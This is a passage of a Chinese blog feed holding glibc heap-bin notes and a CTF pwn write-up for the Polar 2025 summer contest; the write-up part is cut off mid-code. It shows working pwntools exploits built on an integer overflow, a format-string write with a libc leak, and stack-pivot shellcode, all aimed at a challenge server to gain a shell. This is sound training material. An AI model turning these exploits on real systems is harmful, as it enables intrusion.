class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \</span></span><br><span class="line"><span class="meta">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                              \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \</span></span><br><span class="line"><span class="meta">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX 目前尚不清楚，保持桶的宽度不变是否合适，还是也应该按系数 2 进行缩放。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line"><span class="meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \</span></span><br><span class="line"><span class="meta">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span></span><br><span class="line"><span class="meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span></span><br><span class="line"><span class="meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span></span><br><span class="line"><span class="meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span></span><br><span class="line"><span class="meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span></span><br><span class="line"><span class="meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span></span><br><span class="line"><span class="meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span></span><br><span class="line"><span class="meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span></span><br><span class="line"><span class="meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span></span><br><span class="line"><span class="meta">                                 : 126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line"><span class="meta">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \</span></span><br><span class="line"><span class="meta">                                                ? largebin_index_32_big(sz)    \</span></span><br><span class="line"><span class="meta">                                                : largebin_index_32(sz))</span></span><br></pre></td></tr></table></figure><h4 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h4><p>unsorted bin 可以视为空闲 <code>chunk</code> 回归其所属 bin 之前的缓冲区。</p><p>其在 glibc 中具体的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   未排序块</span></span><br><span class="line"><span class="comment">所有因块分割产生的剩余部分，以及所有返回的块，</span></span><br><span class="line"><span class="comment">首先会被放入 “未排序” 桶中。然后，在 malloc 为它们提供一次在入桶前被使用的机会后，这些块会被放入常规桶中。所以，基本上，未排序块列表就像一个队列，块在 free（以及 malloc_consolidate）操作中被放入该列表，而在 malloc 操作中被取出（要么被使用，要么被放入桶中）。未排序块永远不会设置 NON_MAIN_ARENA 标志，所以在进行大小比较时无需考虑该标志。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><blockquote><p>在 ptmalloc 内存管理机制中，<code>NON_MAIN_ARENA</code> flag 是<code>malloc_chunk</code>结构体中<code>size</code>字段的一个标志位，用于表示当前<code>chunk</code>是否属于主线程的分配区（<code>main arena</code>）</p></blockquote><p>从下面的宏我们可以看出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 无法索引的 1 号 bin 用于存放未排序的块。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。unsorted bin 中的空闲 <code>chunk</code> 处于乱序状态，主要有两个来源</p><ul><li>当一个较大的 <code>chunk</code> 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 <code>chunk</code> 不和 top <code>chunk</code> 紧邻时，该 <code>chunk</code> 会被首先放到 unsorted bin 中。关于 top <code>chunk</code> 的解释，请参考下面的介绍。</li></ul><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polar2025夏季赛复现</title>
      <link href="/2025/06/07/polar2025%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
      <url>/2025/06/07/polar2025%E5%A4%8F%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h1><p>整数溢出</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>有system和&#x2F;bin&#x2F;sh，有gets在exit函数中但需要栈溢出控制执行流</p><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">824</span>]; <span class="comment">// [esp+0h] [ebp-338h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter shell:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>u);</span><br><span class="line">  <span class="keyword">return</span> xxx(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">xxx</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">20</span>]; <span class="comment">// [esp+7h] [ebp-21h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n9; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello hacker!&quot;</span>);</span><br><span class="line">  n9 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( n9 &lt;= <span class="number">1u</span> || n9 &gt; <span class="number">9u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">char</span> *)v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf处不能栈溢出但是xxx函数中n9为8位无符号整型，存储范围为0-255，可以构造整数溢出绕过第一步对n9大小的检测从而利用strcpy进行栈溢出，控制执行流到exit函数上，正常打ret2text即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2055</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">bin_sh = <span class="number">0x0804893d</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">exit = <span class="number">0x0804872C</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;you going?&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x21</span>+<span class="number">4</span>)+p32(exit)</span><br><span class="line">payload = payload.ljust(<span class="number">258</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Enter shell:&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;NICE!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x108</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()  </span><br></pre></td></tr></table></figure><h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><p>格式化字符任意写</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>有system，存在格式化字符串漏洞如果将n改为4则可执行gets函数进行栈溢出</p><p> 补a是为了填满8个字节</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2086</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">n = <span class="number">0x0804A06C</span></span><br><span class="line">back = <span class="number">0x08048781</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;yao shell?&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;no\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%4c%6$na&#x27;</span> + p32(n) </span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;hello hacker!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(back) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;666!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x080484A0</span></span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;666!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bllbl-shellcode4"><a href="#bllbl-shellcode4" class="headerlink" title="bllbl_shellcode4"></a>bllbl_shellcode4</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure><p>分析可知第一个函数调用了mmap将bss段改为了可读可写可执行，有一个特殊的gadget </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub rsp, 15h</span><br><span class="line">jmp rsp</span><br></pre></td></tr></table></figure><p>可以将rsp减15再jmp</p><p>第二个函数read字节数较少发现其rsi&#x3D;rbp-9故可根据控制rbp来控制rsi指向bss段栈迁移写入shellcode</p><p><img src="/../images/polar%E5%A4%8F%E5%AD%A3%E8%B5%9B/Snipaste_2025-06-09_11-54-06.png" alt="1"></p><p>第一次输入将rbp改为bss地址</p><p>此时rsi为rbp-9</p><p><img src="/../images/polar%E5%A4%8F%E5%AD%A3%E8%B5%9B/Snipaste_2025-06-09_12-45-35.png" alt="1"></p><p>最后的返回地址是rbp+8也就是0x4040c8我们的输入地址是0x4040b7再<code>ret</code>到<code>sub rsp，15</code>后rsp为0x4040d0</p><p>所以我<code>sub rsp，15</code>前要有0x11的数据</p><p>0xD0-0x15&#x3D;0xbb所以前四个字节为nop，用13个字节完成<code>execve(&#39;/bin/sh&#39;)</code>的调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al,0x3b  ;2 字节</span><br><span class="line">mov edi,0x40203f  ;5 字节</span><br><span class="line">mov esi,ebx  ;2 字节</span><br><span class="line">mov edx,esi  ;2 字节</span><br><span class="line">syscall  ;2 字节</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;1.95.36.136&#x27;,2086)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">bin_sh = <span class="number">0x40203f</span></span><br><span class="line">bss = <span class="number">0x4040C0</span></span><br><span class="line">read = <span class="number">0x40132B</span></span><br><span class="line">leave_ret = <span class="number">0x40128b</span></span><br><span class="line">jmp_rsp_0x15 = <span class="number">0x40136A</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x9</span>) + p64(bss) + p64(read)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Summer Games&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string">mov edi,0x40203f</span></span><br><span class="line"><span class="string">mov esi,ebx</span></span><br><span class="line"><span class="string">mov edx,esi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(<span class="string">&#x27;nop;nop;nop;nop;&#x27;</span>)+asm(shellcode) + p64(jmp_rsp_0x15)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;okok&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="forpwn"><a href="#forpwn" class="headerlink" title="forpwn"></a>forpwn</h1><p>简单的溢出覆盖数据</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>程序自带<code>system(&#39;bin/sh&#39;)</code>达成一定条件后可执行</p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line">  __int64 v4; <span class="comment">// r9</span></span><br><span class="line">  _QWORD Your_lucky_number_is_?[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+60h] [rbp-10h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">12</span>]; <span class="comment">// [rsp+64h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;v8[<span class="number">4</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(Your_lucky_number_is_?, <span class="string">&quot;Your lucky number is ?&quot;</span>);</span><br><span class="line">  HIBYTE(Your_lucky_number_is_?[<span class="number">2</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Your_lucky_number_is_?[<span class="number">3</span>], <span class="number">0</span>, <span class="number">0x48</span>uLL);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  init(&amp;v7, argv, v8, <span class="number">0LL</span>, v3, v4, Your_lucky_number_is_?[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Your_lucky_number_is_?);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;When do you do your pwn?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%c&quot;</span>, &amp;Your_lucky_number_is_?[<span class="number">6</span>] + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(Your_lucky_number_is_?[<span class="number">6</span>]) == <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now, you can pwn!!!&quot;</span>);</span><br><span class="line">    get(Your_lucky_number_is_?);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your_lucky_number_is_?是一个64位的变量</p><p>第一步检测如果输入的数据是’0’的话会直接puts三个！然后结束</p><p>我们要进入else分支所以随便输一个非’0’的数据</p><p>进入get函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">get</span><span class="params">(__int64 Your_lucky_number_is_?)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    gets(Your_lucky_number_is_?);</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="number">10</span> * i + Your_lucky_number_is_?) != <span 